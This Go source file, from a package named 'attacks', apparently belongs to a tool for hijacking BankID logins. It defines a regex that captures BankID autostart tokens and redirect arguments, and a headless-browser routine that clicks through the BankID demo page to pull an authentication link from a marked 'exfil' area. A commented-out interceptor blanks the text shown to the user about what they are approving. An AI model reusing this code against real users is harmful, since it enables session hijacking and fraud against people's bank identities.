package attacks

import (
	"time"

	"github.com/chromedp/chromedp"
)

var SHARED_RESULT []byte
var GLOBAL_RESULT string
var EXFIL_RESULT string

var BankIDAttack AttackType = AttackType{
	Name:      "bankid",
	Regex:     `(bankid:\/\/\/)?\?autostarttoken=[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}&redirect=\w+`,
	Prefix:    "bankid:///",
	ReturnArg: "redirect",
}

func DemoAbleAttacks() []Attack {
	return []Attack{
		{
			Url:  "https://www.bankid.com/demo",
			Path: "/bankid-demo",
			Actions: []chromedp.Action{
				chromedp.Sleep(1 * time.Second),
				chromedp.WaitVisible("/html/body/div/div[2]/div[1]/div[1]/div[1]/div/a[1]", chromedp.BySearch),
				chromedp.Click("/html/body/div/div[2]/div[1]/div[1]/div[1]/div/a[1]", chromedp.BySearch),
				chromedp.WaitVisible("/html/body/div/div[2]/div[1]/div[1]/div/div[2]/a", chromedp.BySearch),
				chromedp.Click("/html/body/div/div[2]/div[1]/div[1]/div/div[2]/a", chromedp.BySearch),
			},
			RedirectURL: "https://www.bankid.com/demo",
			Type:        BankIDAttack,
			ExfilArea:   `/html/body/div/div[2]/div[1]/div[1]/div/div[2]/div[2]/div[1]`,
			// Removing the test markdown text
			/*RequestInterception: func(ev *fetch.EventRequestPaused) *fetch.ContinueRequestParams {
				var fetchRequest *fetch.ContinueRequestParams
				if strings.Contains(ev.Request.URL, "/demo/api/authentication") {
					r, _ := base64.StdEncoding.DecodeString((ev.Request.PostDataEntries[0].Bytes))
					re := regexp.MustCompile(`"userVisibleData":"[^"]*"`)
					noDeviceData := re.ReplaceAllString(string(r), `"userVisibleData":""`)
					fetchRequest = fetch.ContinueRequest(ev.RequestID).WithPostData(base64.StdEncoding.EncodeToString([]byte(noDeviceData)))
				} else {
					fetchRequest = fetch.ContinueRequest(ev.RequestID)
				}
				return fetchRequest
			},*/
		},
	}
}
